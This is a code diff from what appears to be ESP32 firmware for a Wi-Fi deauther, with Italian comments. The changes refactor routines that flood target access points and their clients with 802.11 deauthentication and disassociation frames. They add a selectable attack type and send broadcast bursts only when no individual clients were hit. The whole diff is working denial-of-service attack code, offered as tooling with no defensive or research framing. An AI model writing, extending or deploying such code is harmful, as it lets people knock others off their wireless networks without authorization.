@@ -56,9 +56,11 @@ static uint8_t get_csa_switch_channel(uint8_t current_channel) {
  * @brief Helper function that executes the selected attack on a specific BSSID
  * Assumes the radio is already on the correct channel!
  */
-static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssid, uint8_t ap_channel)
+static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssid, uint8_t ap_channel, deauther_attack_type_t attack_type)
 {
-    switch (current_attack_type) 
+    bool clients_targeted = false;
+
+    switch (attack_type) 
     {
         // --- ATTACCHI IBRIDI (Client Specifici -> Fallback Broadcast) ---
         case DEAUTHER_ATTACK_DEAUTH_FRAME:
@@ -70,11 +72,14 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                             continue; 
                         }
                         wifi_attack_deauth_basic(clients.client[c].mac, ap_bssid, reason_code);
+                        clients_targeted = true;
                     }
                 }
             }
-            for(int i = 0; i < 15; i++) {
-                wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
+            if(!clients_targeted) {
+                for(int i = 0; i < 15; i++) {
+                    wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
+                }
             }
             break;
         }
@@ -88,11 +93,14 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                             continue; 
                         }
                         wifi_attack_send_disassoc(ap_bssid, clients.client[c].mac, reason_code);
+                        clients_targeted = true;
                     }
                 }
             }
-            for(int i = 0; i < 15; i++) {
-                wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
+            if(!clients_targeted) {
+                for(int i = 0; i < 15; i++) {
+                    wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
+                }
             }
             break;
         }
@@ -107,12 +115,15 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
                         }
                         wifi_attack_deauth_basic(clients.client[c].mac, ap_bssid, reason_code);
                         wifi_attack_send_disassoc(ap_bssid, clients.client[c].mac, reason_code);
+                        clients_targeted = true;
                     }
                 }
             }
-            for(int i = 0; i < 15; i++) {
-                wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
-                wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
+            if(!clients_targeted) {
+                for(int i = 0; i < 15; i++) {
+                    wifi_attack_deauth_basic(NULL, ap_bssid, reason_code);
+                    wifi_attack_send_disassoc(ap_bssid, broadcast_mac, reason_code);
+                }
             }
             break;
         }
@@ -232,7 +243,7 @@ static void execute_attack_on_target(const uint8_t *ap_bssid, const char *ap_ssi
 }
 
 
-static void deauther_send_frames(const target_info_t *target)
+void deauther_send_frames(const target_info_t *target, deauther_attack_type_t attack_type)
 {
     if (target == NULL) return;
 
@@ -277,7 +288,7 @@ static void deauther_send_frames(const target_info_t *target)
                 {
                     // Burst di pacchetti
                     for(int k=0; k<15; k++) {
-                        execute_attack_on_target(aps.ap[i].record.bssid, (const char*)aps.ap[i].record.ssid, current_ch);
+                        execute_attack_on_target(aps.ap[i].record.bssid, (const char*)aps.ap[i].record.ssid, current_ch, attack_type);
                     }
                 }
                 if ((esp_timer_get_time() - start_time) / 1000 > (ATTACK_WINDOW - 20)) {
@@ -302,7 +313,7 @@ static void deauther_send_frames(const target_info_t *target)
         /* Force ROC Requesto to prevents reception of ACK when sending UNICAST frames */
         wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
         vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
-        execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel);
+        execute_attack_on_target(target->bssid, (const char*)target->ssid, target->channel, attack_type);
         //wifi_set_temporary_channel(target->channel, ATTACK_WINDOW);
         //vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
         //int64_t start_time = esp_timer_get_time();
@@ -346,7 +357,7 @@ static void deauther_task(void *pvParameters)
     while(deauther_running)
     {
         wifi_sniffer_get_clients(&clients);
-        deauther_send_frames(target);
+        deauther_send_frames(target, current_attack_type);
         vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
 
         /* Scan for APs */
@@ -424,4 +435,10 @@ void deauther_stop(void)
 bool deauther_is_running(void)
 {
     return deauther_running;
+}
+
+
+void deauther_set_attack_type(deauther_attack_type_t attack_type)
+{
+    current_attack_type = attack_type;
 }
